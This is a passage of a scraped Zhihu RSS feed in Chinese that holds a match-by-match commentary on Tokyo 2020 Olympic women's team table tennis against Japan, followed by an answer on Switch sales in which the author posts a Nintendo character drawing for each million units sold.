伊藤</h2>\n<p>孙颖莎再战伊藤，刺激。</p>\n<p>第一局以生胶的慢热，孙颖莎是需要拿下的。开局领先，伊藤反手还没什么球，侧剌之类的很少上台，正手也有失误。但孙颖莎还是吃了发球的，这一点需要注意。</p>\n<p>先不论输赢，有一点是中国队的进步，也是信心的提升，那就是孙颖莎完全不怕接发球劈长后与伊藤对反手了。伊藤也明白这一点，在局中段积极求变，反而多去送孙颖莎的正手及中路偏正手。孙颖莎反倒不太舒服，尤其是六平那一球，生胶球送到这个位置的轨迹孙颖莎不太适应。</p>\n<p>有点在跟着伊藤的节奏走。孙颖莎还是要再把节奏放慢点，质量要出得来。比如7比8的那球就很好，多等一个点，质量再提高一点。今天伊藤的打法有所变化，没有完全扑在台子上，孙颖莎也要适时进行调整。</p>\n<p>非常好，孙颖莎的节奏慢下来了。伊藤站在偏中台的位置，不再以快取胜，而是节奏变化加上颗粒的怪。但孙颖莎只要盯住了把质量加上去，哪怕稍微慢一点，也是不怕伊藤拍弧圈的。事实上，伊藤目前为止的打法就不是近台拍。果然采取更合理的战术后，孙颖莎连下四分，夺下第一局。</p>\n<p>第二局似乎伊藤打算变招了，回到老战术，速度极快。不论哪种打法，伊藤都是有相当大的威胁的。孙颖莎如果质量出得来，打得还是非常顺手，但伊藤的起板盯住孙颖莎的反手大斜线以及中路偏正手，还是有点难受。双方拉锯至五平。</p>\n<p>伊藤与孙颖莎进入持续反手相持，孙颖莎的反手状态不错，摩擦感觉很好，持续把颗粒回的下沉球挂住，并寻隙加力至伊藤反手大角得分。伊藤对自己的反手不太自信，心态受到了影响，发球失误。教练赶紧叫暂停。</p>\n<p>居然还把伊藤发球失误做成慢动作回放hhh这个编导有点腹黑（</p>\n<p>暂停结束，孙颖莎反手质量依旧可圈可点，前三板的计算也比伊藤更精良，起板快，线路好，发球伊藤也还没掌握规律。孙颖莎迅速拿下第二局，形势很不错。</p>\n<p>伊藤从单打半决赛开始就吃孙颖莎的中路发球，现在还吃，日本队这届教练不行啊…</p>\n<p>第三局第一回合，伊藤的线路无可挑剔。但就像马龙对樊振东的决赛，樊振东的线路很好，但马龙就是更胜一筹。孙颖莎的线路显得更加刁钻，气势极盛。不过紧接着吃了个不转发球，士气受了影响，后面又吃了一个。</p>\n<p>前两局里孙颖莎严格意义上来说，也有些吃发球，但只要劈到了底线，倒也不怕伊藤起板相持。这局的几个吃发球不同，要么出界，要么台内冒得老高，就完全没有周旋的余地了。伊藤这局的正反手状态均非常好，零失误。8比2领先时更是上演了一个瞎拍神球。不知孙颖莎是会复现半决赛第二局的逆转，还是会战略性先放掉一局。</p>\n<p>孙颖莎这局没什么出手的机会，伊藤的状态开始出来了，值得警惕。孙颖莎吃伊藤的不转吃了非常多个，笔者粗略数数就起码有三个。还是要咬住，质量要加上去。线路也要多想想，接发球送反手太多了也容易被算住。</p>\n<p>第四局孙颖莎上来有点小宇宙爆发的意思了，质量非常高，伊藤几乎没有还手之力。后面伴随着孙颖莎的两个运气球、伊藤的机会球失误、孙颖莎的完美接发，比分迅速拉开，孙颖莎7比2领先。但接下来伊藤扳回一分，告诉孙颖莎自己相持的状态仍在。孙颖莎再次劈长擦边，又是一个运气球，伊藤已经哭笑不得了。</p>\n<p>孙颖莎得理不饶人，正反手全力施为，力量拉满，穿直线、反手爆拉侧切，直接把伊藤的花样全部破掉，11比3取得胜利，中国队大分2比0领先日本。</p>\n<p>本场比赛，伊藤第一二局的战术变化可圈可点，给孙颖莎造成了一定的不适应。团体五局三胜，节奏快，易爆冷，孙颖莎输了一局是有较大压力的。好在孙颖莎顶住压力，后半盘更是顺风拿下，奥运赛场连续两次战胜伊藤，基本已锁定了24巴黎的单打名额。</p>\n<hr>\n<h2>第三场 王曼昱 vs 平野</h2>\n<p>本次奥运国乒启用p卡，换王曼昱上场。固然有刘诗雯伤病缘故，自然也有培养新生代之意。王曼昱实力自然比平野强不少，尤其自17年国乒对平野深入研究后。笔者记得那时平野和国乒多人都碰过了，大家都拿一个打法打她——送反手、中路长，不管是发球还是接发劈长，但她就是摆脱不了（</p>\n<p>开局平野速度很快，这也是她的特长。王曼昱作为实力占优的一方，千万不要跟着以快打快，否则动作不到位，高速相持中就容易下网失误。王曼昱身高臂长，一定要把速度慢下来，质量加上去。王曼昱也确实是这么做的，很顺利就拿下第一局。</p>\n<p>第二局王曼昱上来就全面占优，逼日本叫了暂停。这个暂停叫得好，把王曼昱火热的状态叫没了。一个台内轻挑直线，一个反手起板，一个扑在近台的摆速得分，平野扳回局势。中间王曼昱的劈长思路还是对的，但那球旋转还没加上去，没送到平野的弱点上。王曼昱还是要多加旋转上去，要劈长就剁下去，要上手就像双打最后几球一样，把质量都打出来，平野的速度就被限制了。比如王曼昱4比7落后的那个劈长，做得就比前半段的好。</p>\n<p>看来这个劈长是王曼昱想明白后状态回暖的关键点，王曼昱一路追分至七平，但在八平后还是被平野套路了一个线路，到关键球了。下一回合虽然勉力撑住得分，但还是很被动，让人心惊肉跳。</p>\n<p>九平，王曼昱手握两个发球。平野的正手落点到了正手小三角，速度位置都近乎完美。但王曼昱拥有力量优势，身高臂长，护台极广，硬是直接步法到位快带回来。平野扛不住质量，回防出现机会，被王曼昱穿直线直接得分。这一球太精彩了，平野打到那个落点估计认为自己已经有了。这一分拿下，基本这局已经很上风。果然王曼昱紧接着在相持中稳住，而平野急于拉穿失分，王曼昱逆转第二局！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fed11cb3ea4723a3a5ace3d3a0db6472_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1117\" data-size=\"normal\" data-caption=\"图源：咪咕直播截图\" data-watermark=\"watermark\" data-original-src=\"v2-fed11cb3ea4723a3a5ace3d3a0db6472\" data-watermark-src=\"v2-ecb2460cc3694270fdc17a0915001329\" data-private-watermark-src=\"v2-85042454dd61639f45899ce9d1e54054\"></p>\n<p>第三局，王曼昱以雷霆之势登场，一度大比分领先。但随着几个接发的问题以及平野的运气球，气势有所回落，教练及时叫了暂停。暂停结束，王曼昱反手起板质量很高，落点在中路偏正手，非常完美。平野的移动速度似乎体现不出什么优势了。平野开始搏杀，但失误率很高，基本没有得分。最终王曼昱轻松获胜，11比3战胜平野！</p>\n<p>王曼昱在整场比赛中体现了极坚韧的意志，再加上护台优势，很多极被动的球都能扭转得分。到了第三局，平野已经没有什么办法了，只好搏杀，但又没有状态。相信以王曼昱的能力，加上奥运等大赛的磨炼，下个周期一定也会是国乒的中流砥柱。</p>\n<hr>\n<p>还没看够？不妨来看看孙颖莎与伊藤的第一次奥运对决：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2026457583\" class=\"internal\">叶子盛：2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><p><br></p>\n<hr>\n<p>奥运赛程众多，多数以文字简评方式进行赏析。笔者创建了一个专栏，目前收录了较为齐全的各场次简评，自忖在全网算做得最有诚意的之一了。见：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/c_1404020055374372864\" data-image=\"https://pic2.zhimg.com/v2-52a669542a8699d42a3c5796c7e536e9.jpg\" data-image-width=\"200\" data-image-height=\"200\" class=\"internal\">乒乓赛事简评</a><p>欢迎前去专栏对我付出精力更大的图文作品进行指正。无团队，无盈利，用爱发电。如果喜欢，欢迎关注（含多个编辑推荐等）：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/biqinzhai\" data-image=\"https://pic3.zhimg.com/v2-cde3d62e8270146ee8593adcb47189c4.jpg\" data-image-width=\"183\" data-image-height=\"183\" class=\"internal\">避秦斋</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/macaoleaf?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">叶子盛</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477548190/answer/2041170193?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">506 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/475772055?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><br><a href=\"http://www.zhihu.com/question/475485375?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运乒乓球女单 1/4 决赛石川佳纯 1:4 不敌对手出局，如何评价本场比赛？</a><br>\n","link":"http://www.zhihu.com/question/477548190/answer/2041170193?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"SWITCH销量会破亿吗？","date":"2021-08-05 11:30:08","description":"\n<p>不可能破亿的。</p>\n<p><br></p>\n<p>能过5000万就了不起了。</p>\n<p><br></p>\n<p>我觉得是过不了5000万这条线的，要是过了的话，每过100万我在这个回答里更新一个任天堂游戏人物的画像。</p>\n<hr>\n<p>愿赌服输。</p>\n<p><br></p>\n<p>5100万突破的马里奥</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7e97c47a40b703e0f1619b32dfcd7a49_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"800\" data-watermark=\"original\" data-original-src=\"v2-7e97c47a40b703e0f1619b32dfcd7a49\" data-watermark-src=\"v2-5b759cb4c8462090ad284ec0dba96d8b\" data-private-watermark-src=\"v2-6ef7711f8a8da088164c62db56a4c2c0\"></p>\n<p>5200万突破的碧琪公主</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b4941391c25fa167c5f5269be2c3ad45_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"800\" data-watermark=\"original\" data-original-src=\"v2-b4941391c25fa167c5f5269be2c3ad45\" data-watermark-src=\"v2-2443f779a45575d6ac0e0fa42ed4a63c\" data-private-watermark-src=\"v2-ee3ae8ac2527c26bb6466b79b892e4e6\"></p>\n<p>财报更新了，目前5577万。</p>\n<p>5300万突破的罗伊·阿夸·库巴</p>\n<p><img src=\"https://pic2.zhimg.com/v2-02cfe45c2d6a5ff805df3180039a6799_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-02cfe45c2d6a5ff805df3180039a6799\" data-watermark-src=\"v2-0cf443a06cedc28ef5e55e9bb3f1218b\" data-private-watermark-src=\"v2-5dee1b4238d232686bdb3e675f8b7b2a\" data-tags=\"politic\"></p>\n<p>5400万突破的初代林克</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1f9c595e2bc4f4e8ec212dbfc1847c31_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-1f9c595e2bc4f4e8ec212dbfc1847c31\" data-watermark-src=\"v2-17cb54ac8696d41ebfe4aed29ee6fe9b\" data-private-watermark-src=\"v2-2dc9b3cb474f37f192c3e56ebc690316\"></p>\n<p>5500万突破的小麦克</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e4a14e1f8a7019850a2e6074fcceefb9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-e4a14e1f8a7019850a2e6074fcceefb9\" data-watermark-src=\"v2-93d3c9cdbd6be2e7f438db7cd9b5a9d2\" data-private-watermark-src=\"v2-0d12380b8963c5ad3de55277cd57eb8b\"></p>\n<p> 任天堂新财报出炉，硬件销量累计6144万台。</p>\n<p>5600万突破的《打鸭子》里的狗。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-34800cf72d395278192a449fdab15fb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-34800cf72d395278192a449fdab15fb4\" data-watermark-src=\"v2-7d1c6cc6d39d2c640437781627e23906\" data-private-watermark-src=\"v2-350f7ba3a744abf92073941d56990587\"></p>\n<p>5700万突破的大库巴。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3480d71eab7a33d784c3ae5c7ccf73c2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3480d71eab7a33d784c3ae5c7ccf73c2\" data-watermark-src=\"v2-43671d455892d4f7c17649c8f35c3ef6\" data-private-watermark-src=\"v2-fc50e92beba929d596921cbc51184ba3\"></p>\n<p>5800万突破的初代塞尔达公主。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b699e71ff18611272d87c9dab241f365_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-b699e71ff18611272d87c9dab241f365\" data-watermark-src=\"v2-5b4694e35ff429dab96642d2933fba0d\" data-private-watermark-src=\"v2-05ff01512c1c3b5fa32a4c48d6c27d19\"></p>\n<p>5900万突破的……“公主在另一个城堡”</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ac4d4dff3b84870f453a689bbcd12f2f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-ac4d4dff3b84870f453a689bbcd12f2f\" data-watermark-src=\"v2-2a084da290cd5f0d9576cbe3877ab809\" data-private-watermark-src=\"v2-c7fffa18dc06036fbabd43e6e1339f15\" data-tags=\"politic\"></p>\n<p>6000万突破的DONKEY KONG X 凑阿夸</p>\n<p><img src=\"https://pic4.zhimg.com/v2-75d04349ee9d4784f55eadb4ab8eafca_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-75d04349ee9d4784f55eadb4ab8eafca\" data-watermark-src=\"v2-47f2a86f52169155ba5bb33081fbfb44\" data-private-watermark-src=\"v2-189e7b375401321be63bc50717a90aec\"></p>\n<p>6100万突破的《MOTHER》初代主角：NINTEN</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f566941b5a0bacd5c09a8b69a1b4ca89_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f566941b5a0bacd5c09a8b69a1b4ca89\" data-watermark-src=\"v2-0f343fb74aa79ef9222140944ede4f86\" data-private-watermark-src=\"v2-ab8892c93527abbfe8c7161e69bea803\"></p>\n<p>任天堂新财报出炉，硬件销量累计6830万台。</p>\n<p>因为这次有人提醒所以提前几天就画了……到家后传上来吧。</p>\n<p>这次我猜得挺准的……</p>\n<p>6200万突破的卡比（卡比的造型是真好画啊……）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4803c93cc89ab7038c0e50efcabcf284_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4803c93cc89ab7038c0e50efcabcf284\" data-watermark-src=\"v2-05307b92cfd5cd1ec15163ac2fd10706\" data-private-watermark-src=\"v2-77bec68f4d48ddeb9e64d6b9889ee2ef\"></p>\n<p>6300万突破的马里奥系列经典家门怪酷栗宝。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3016f768a9d2caa844ad73888afb9bba_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3016f768a9d2caa844ad73888afb9bba\" data-watermark-src=\"v2-4aaf71c3a15df5f274d1609204799d0e\" data-private-watermark-src=\"v2-aff026e2ef5922fc1b5dc340bb9eedcb\"></p>\n<p>6400万突破的塞尔达传说系列人气角色……汀格尔（不过气球装的来源是DS上的汀格尔气球大战）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f44b617999b0a5fd1955a4970bba2d4c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f44b617999b0a5fd1955a4970bba2d4c\" data-watermark-src=\"v2-9a88e892a4097e9b1b0ae448df9e88ea\" data-private-watermark-src=\"v2-f639da87b33cf41809fbf8148251ca7d\"></p>\n<p>6500万突破的火焰之纹章初代男主马尔斯。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4fc800703398b2206fc5b0f0b6832665_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4fc800703398b2206fc5b0f0b6832665\" data-watermark-src=\"v2-44fecc7621f294be30e695c0c455631b\" data-private-watermark-src=\"v2-9ee0629b4f51859c72a4007b95ab209f\"></p>\n<p>6600万突破的塞尔达传说风之杖的BOSS加农。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-eb9869674e2a8829c733e496254c98b0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-eb9869674e2a8829c733e496254c98b0\" data-watermark-src=\"v2-f0a86545a27a07766da8008c3c48672f\" data-private-watermark-src=\"v2-e668ab9e0e768590bf17ecf7eff1b04b\"></p>\n<p>6700万突破的银河战士系列主角萨姆斯。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-81e3fe5406082c4c3eeb50a962907a8f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-81e3fe5406082c4c3eeb50a962907a8f\" data-watermark-src=\"v2-55eec70f197b516504dca4c76d2a9658\" data-private-watermark-src=\"v2-3e2f1cc0417f0ead4bfc87a202140399\"></p>\n<p>6800万突破的马里奥系列老二哥路易。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c867c6fd6d65b4cbfe181a31cf1d2e68_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-c867c6fd6d65b4cbfe181a31cf1d2e68\" data-watermark-src=\"v2-cb561b7ec9113cbbcecc0f9b22a08f62\" data-private-watermark-src=\"v2-c9a298d2a93c72d3c6f135c4051d26f6\"></p>\n<p>任天堂新财报出炉，硬件销量累计7987万台。</p>\n<p>虽然提前画了些但少估了200万，到家后快点画完补上两张……</p>\n<p>6900万突破的马里奥系列经典怪德哥（其实叫锤子兄弟……）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8b2f990ffec63361f15bd33026411289_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-8b2f990ffec63361f15bd33026411289\" data-watermark-src=\"v2-e52ac808c5436d3e2f3de80d209f0b64\" data-private-watermark-src=\"v2-65bbca677355c656e282506641a2a306\"></p>\n<p>7000万突破的老娘经典怪星人</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0d1c6548698743b1ef4c4287603c64cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-0d1c6548698743b1ef4c4287603c64cd\" data-watermark-src=\"v2-cd1a2522295b09ea4464f0e3300577cb\" data-private-watermark-src=\"v2-ad4dbba6397b9f6335b3a183fd8fb99e\"></p>\n<p>7100万突破的纸马折纸王国的炸弹彬</p>\n<p><img src=\"https://pic2.zhimg.com/v2-226f2adb536326398924c042bbb75602_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-226f2adb536326398924c042bbb75602\" data-watermark-src=\"v2-b391eeeab09d63f2b6f4e06e0a34e4f0\" data-private-watermark-src=\"v2-4a5afc5a0f16cfea629c8010b4d2ec9c\"></p>\n<p>7200万突破的F-ZERO猎鹰队长</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ac4847300494463862f509f3cbf9c5d2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-ac4847300494463862f509f3cbf9c5d2\" data-watermark-src=\"v2-adbd433b35e540fb347ba458cb07c75b\" data-private-watermark-src=\"v2-2814d104d864e374c1980d59d9f5b5c9\"></p>\n<p>7300万突破的口袋妖怪经典PM鲤鱼王</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1e278a6a9f60a043bbbb7857a927edf3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-1e278a6a9f60a043bbbb7857a927edf3\" data-watermark-src=\"v2-11f2f41b0bb6487694ac3475f889fa7d\" data-private-watermark-src=\"v2-2504c7a60907cfb9a886c05a7288404f\"></p>\n<p>7400万突破的魔法假日女主角</p>\n<p><img src=\"https://pic1.zhimg.com/v2-575443f7856df5a41c3126730b52102a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-575443f7856df5a41c3126730b52102a\" data-watermark-src=\"v2-b351c118ae00d047f9ca4c16084d86eb\" data-private-watermark-src=\"v2-d814264ddea00c0c4b3768e5b7fa97b0\"></p>\n<p>7500万突破的塞尔达时之笛傲娇佐拉小公主露塔</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d7f34f8247ff89807684c4a587bc6eb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-d7f34f8247ff89807684c4a587bc6eb4\" data-watermark-src=\"v2-45c1ebafe29ac4a705d870b80416d8a2\" data-private-watermark-src=\"v2-9eccac143414d4a8978d64b1ec8072cd\"></p>\n<p>7600万突破的口袋妖怪PM 巨钳螳螂</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fb76ae1344f27a277a0dc219d1c0e323_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-fb76ae1344f27a277a0dc219d1c0e323\" data-watermark-src=\"v2-e88360ee0d8a0fea1e9700e2182d02d6\" data-private-watermark-src=\"v2-8a380a6430863c1ffee7c6134ca33836\"></p>\n<p>7700万突破的动物之森恶毒资本家狸克</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3a0becf83c4f72e574f361e50e78b34d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-3a0becf83c4f72e574f361e50e78b34d\" data-watermark-src=\"v2-edf5e367e272d180696c5ba4ab650bf3\" data-private-watermark-src=\"v2-78ace80e99951ca815f1d7e9be2b3a9f\"></p>\n<p>7800万突破的皮克敏主角奥利马</p>\n<p><img src=\"https://pic2.zhimg.com/v2-71e28f8a0385653c4bd5fe662b7a2930_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-71e28f8a0385653c4bd5fe662b7a2930\" data-watermark-src=\"v2-5c39930229a2fb2f84ab0fb6dc42d29f\" data-private-watermark-src=\"v2-0b4139cb2baa1a72f4b89535bcba2237\"></p>\n<p>7900万突破的黄金太阳米雅莉</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4127f601aab0aa6a957275417cb2484a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-4127f601aab0aa6a957275417cb2484a\" data-watermark-src=\"v2-4ae487bb7391aea965d9fe40e010dd06\" data-private-watermark-src=\"v2-dc881b0ee2444af0c2fa03a2d344868d\"></p>\n<p>……躺着也赚爆，ND还会开吗。</p>\n<p> 任天堂财报出炉，截止2021年3月31日：NS硬件销量累计8459万台。</p>\n<p>最近痛风（不是MHR）中只能保持着一个难受的姿势画图，没什么耐心就偷了一些工……</p>\n<p>8000万突破的马里奥系列的黛西公主。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2b1107350eb990c83225ee4f616e0202_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-2b1107350eb990c83225ee4f616e0202\" data-watermark-src=\"v2-a0486a36b1dccaf4efc199ec31f65d1e\" data-private-watermark-src=\"v2-90bcb7669e244cbaa419957b98de4186\"></p>\n<p>8100万突破的健身环BOSS堕拉贡，顺便庆贺健身环突破1000万销量。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-dc89fc783f84f45405a049b65593e926_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1100\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-dc89fc783f84f45405a049b65593e926\" data-watermark-src=\"v2-4a6d9eba1d4fdd222091e0d684483737\" data-private-watermark-src=\"v2-d03dbb1f838f5d4448284212ffed6c27\"></p>\n<p>8200万突破的口袋妖怪大朝北鼻</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f71f639f10888c3781d5d938aee51718_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f71f639f10888c3781d5d938aee51718\" data-watermark-src=\"v2-6170a25880e687ef62a8ada01da4a324\" data-private-watermark-src=\"v2-37ba9ea174ce13053c19a3c1bbc33922\"></p>\n<p>8300万突破的迪迪刚</p>\n<p><img src=\"https://pic3.zhimg.com/v2-48a68a8f1a13c99de91f55b962c6616b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-48a68a8f1a13c99de91f55b962c6616b\" data-watermark-src=\"v2-eb1e481256fcfb6ff74d1c139b30783d\" data-private-watermark-src=\"v2-946769d6fbfc45f44a13872cb77d3687\"></p>\n<p>8400万突破的火纹初代女主希达</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f1d6481f538b2d400c7d1d4fbe65980e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-f1d6481f538b2d400c7d1d4fbe65980e\" data-watermark-src=\"v2-8a542c9eb9fd526432313aa4313599a8\" data-private-watermark-src=\"v2-35da410d847903c36d70c7c03bdac238\"></p>\n<p>该忏悔了……</p>\n<p>任天堂财报出炉，截止2021年6月30日：NS硬件销量累计8904万台。</p>\n<p>这次有之前多画的凑数，倒是省事……</p>\n<p>8500万突破的零装萨姐</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5f2b2f55f11a627558080182c5ef7eb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-5f2b2f55f11a627558080182c5ef7eb4\" data-watermark-src=\"v2-9ce5618b77239810a63041682f53d18b\" data-private-watermark-src=\"v2-bc6166d27a756bb07139b9865dfd83d5\"></p>\n<p>8600万突破的马里奥系列炮弹刺客</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8e716ed1ecb8ea2439acc0a39ccfdf3b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-8e716ed1ecb8ea2439acc0a39ccfdf3b\" data-watermark-src=\"v2-f6745518de669ccc4d63fa490499c0d1\" data-private-watermark-src=\"v2-869e94fce98da02f7b0eb847accf3121\"></p>\n<p>8700万突破的金属之光主角老妹日向梓</p>\n<p><img src=\"https://pic4.zhimg.com/v2-55557db03287da3fdde7cfe83a21ee4d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-55557db03287da3fdde7cfe83a21ee4d\" data-watermark-src=\"v2-f2ba8b2c7b7c006c73c963d9cae0b286\" data-private-watermark-src=\"v2-1c8738f450b05cb665b410f86de18304\"></p>\n<p>8800万突破的赫拉克罗斯</p>\n<p><img src=\"https://pic2.zhimg.com/v2-433f189074bc85d487d260c8b2c3a9de_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-433f189074bc85d487d260c8b2c3a9de\" data-watermark-src=\"v2-c21118e69d7de503ef0128763e490da7\" data-private-watermark-src=\"v2-958bbdc57fff20166edfd779cec3417c\"></p>\n<p>8900万突破的面具商人（这个角色真是塞尔达系列里最让我感觉渗人的……某种意义上的童年阴影）</p>\n<p><img 